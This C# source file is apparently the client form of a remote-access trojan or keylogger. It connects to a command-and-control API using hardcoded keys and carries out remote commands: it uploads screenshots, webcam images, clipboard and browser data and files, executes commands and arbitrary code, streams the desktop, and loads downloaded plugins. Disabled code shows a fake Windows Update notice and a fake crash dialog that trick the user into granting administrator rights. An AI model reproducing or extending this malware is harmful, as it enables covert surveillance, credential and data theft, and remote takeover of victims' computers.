using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using KeyLogTest.Delegates;
using System.Net;
using Library;
using System.Diagnostics;
using Client.Properties;
using System.Security.Principal;
using Models;
using Ionic.Zip;
using Ionic.Zlib;
using System.Reflection;
using PluginManager;

namespace Client
{
    public partial class Form1 : Form, IPluginHost
    {
        public bool HasInternetConnection
        {
            get { return false; }
        }
        NotifyIcon notifyIcon;
        private PluginManager.PluginManager pluginManager;

        public Form1(string[] args)
        {
            InitializeComponent();
            AppendText("Initializing...");
            Handler.Instance.Initialize(new HandlerInitData()
            {
                HostForm = this,
                Url = new Uri("http://localhost:64737/api"),
                //Url = new Uri("http://restless-honey-seeker.azurewebsites.net:80/api"),
                APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1",
                APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef",
                CONNECTION_TIMEOUT = 10000,
                CONNECTION_INTERVAL = 10000,
                startNewProcessOnExit = false,
                HideOnStart = false
            });
            Handler.Instance.OnCommandEvent += Instance_OnCommandEvent;
            Handler.Instance.OnAuthorizedEvent += Instance_OnAuthorizedEvent;
            LoadPlugins();
            //SetupFakeMsg();
            //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
        }

        void AppendText(string text)
        {
            richTextBox1.AppendText(string.Format("{0:G}", DateTime.Now) + " : " + text + Environment.NewLine);
        }

        void Instance_OnAuthorizedEvent(object sender, AuthEventArgs e)
        {
            if (e.IsAuthenticated)
            {
                AppendText("Authorized");
            }
        }

        void Instance_OnCommandEvent(object sender, CommandEventArgs e)
        {
            var s = Handler.Instance.Transmitter.TSettings;
            if (e.Command != ECommand.DO_NOTHING)
            {
                AppendText("Command: " + e.Command + ", File: " + s.File + ", Parameters: " + s.Parameters);
            }
            UploadResult result = null;
            switch (e.Command)
            {
                case ECommand.SET_TRANSMISSION_INTERVAL:
                    Handler.Instance.SetTransmissionInterval();
                    break;
                case ECommand.UPLOAD_IMAGE:
                    result = Handler.Instance.UploadDesktopImage();
                    break;
                case ECommand.EXECUTE_COMMAND:
                    Handler.Instance.ExecuteCommand();
                    break;
                case ECommand.UPLOAD_CLIPBOARD_DATA:
                    Handler.Instance.UploadClipboardData();
                    break;
                case ECommand.UPLOAD_WEBCAM_IMAGE:
                    Handler.Instance.UploadWebcamImage();
                    break;
                case ECommand.UPLOAD_PORT_INFO:
                    result = Handler.Instance.UploadPortInfo();
                    break;
                case ECommand.UPLOAD_PROCESS_INFO:
                    Handler.Instance.UploadProcessInfo();
                    break;
                case ECommand.UPLOAD_BROWSER_DATA:
                    Handler.Instance.UploadBrowserData();
                    break;
                case ECommand.UPLOAD_FILE_EVENTS:
                    Handler.Instance.UploadFileEvents();
                    break;
                case ECommand.DOWNLOAD_FILE:
                    // File retreived from C&C server
                    Handler.Instance.DownloadFile();
                    break;
                case ECommand.UPLOAD_FILE:
                    // File transmitted to C&C server
                    Handler.Instance.UploadFile();
                    break;
                case ECommand.STREAM_DESKTOP:
                    Handler.Instance.StreamDesktop();
                    break;
                case ECommand.STOP_STREAM_DESKTOP:
                    Handler.Instance.StopStreamDesktop();
                    break;
                case ECommand.MOVE_CURSOR:
                    Handler.Instance.CursorInteract();
                    break;
                case ECommand.KILL_PROCESS:
                    Handler.Instance.KillProcess();
                    break;
                case ECommand.EXECUTE_PLUGIN:
                    ExecutePlugin();
                    break;
                case ECommand.KILL_PLUGIN:
                    KillPlugin();
                    break;
                case ECommand.UPLOAD_PLUGIN:
                    UploadPlugin();
                    break;
                case ECommand.EXECUTE_CODE:
                    Handler.Instance.ExecuteCode();
                    break;
            }
            Handler.Instance.UploadResult(result);
        }

        private void UploadPlugin()
        {
            byte[] data = Handler.Instance.Transmitter.DownloadFile();
            if (data != null)
            {
                var path = Handler.Instance.DirPlugins;// Path.Combine(dirPlugins, Handler.Instance.Transmitter.TSettings.File);
                //File.WriteAllBytes(path, data);
                try
                {
                    Compression.Extract(data, path);
                }
                catch (Exception)
                {
                    // probably not a zip file
                }
            }
            LoadPlugins();
        }

        private void KillPlugin()
        {
            if (pluginManager != null)
            {
                var plugin = pluginManager.GetPlugin(Handler.Instance.Transmitter.TSettings.File);
                if (plugin != null)
                {
                    pluginManager.RemovePlugin(plugin);
                }
            }
        }

        private void ExecutePlugin()
        {
            if (pluginManager != null)
            {
                var plugin = pluginManager.GetPlugin(Handler.Instance.Transmitter.TSettings.File);
                if (plugin != null)
                {
                    object data = null;
                    try
                    {
                        data = plugin.Client.Execute(Handler.Instance.Transmitter.TSettings.Parameters);
                    }
                    catch (Exception ex)
                    {
                        data = ex.ToString();
                    }
                    if (data != null)
                    {
                        File.WriteAllBytes(Path.Combine(Handler.Instance.AppDir, "data.dat"), Encoding.Default.GetBytes(Convert.ToString(data)));
                        Handler.Instance.Transmitter.UploadData("data.dat", data, false);
                    }
                }
            }
        }

        void LoadPlugins()
        {
            pluginManager = new PluginManager.PluginManager(this, Handler.Instance.DirPlugins);
            //Initialize the plugins
            foreach (var p in pluginManager.Plugins)
            {
                try
                {
                    p.Client.Initialize();
                }
                catch (Exception)
                {
                    // write better code ;) or throw in the trash (pun intended)
                }
            }
        }


        private void SetupFakeMsg()
        {
            var fakeForm = new FormStoppedWorking();
            fakeForm.ShowDialog();
            fakeForm.FormClosing += (o, e) =>
            {
                //HideForm();
            };
        }

        private void CreateFakeWindowsUpdateNotifyIcon(int msDelay, string title, string text)
        {
            System.Timers.Timer timer = new System.Timers.Timer(msDelay);
            timer.Elapsed += (o, e) =>
            {
                timer.Enabled = false;
                notifyIcon = new NotifyIcon();
                notifyIcon.Icon = Resources.windows_update_icon_2;
                notifyIcon.BalloonTipIcon = ToolTipIcon.Warning;
                notifyIcon.BalloonTipTitle = title;
                notifyIcon.BalloonTipText = text;
                notifyIcon.Visible = true;
                notifyIcon.Click += notifyIcon_Click;
                notifyIcon.BalloonTipClicked += notifyIcon_BalloonTipClicked;
                notifyIcon.ShowBalloonTip(5000);
            };
            timer.Enabled = true;
        }

        void notifyIcon_Click(object sender, EventArgs e)
        {
            notifyIcon.ShowBalloonTip(5000);
        }

        void notifyIcon_BalloonTipClicked(object sender, EventArgs e)
        {
            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!hasAdministrativeRight)
            {
                if (Handler.Instance.RunElevated(Application.ExecutablePath))
                {
                    this.Close();
                    Application.Exit();
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                Handler.Instance.Transmitter.DeAuthorize();
            }
            catch { }
        }
    }
}
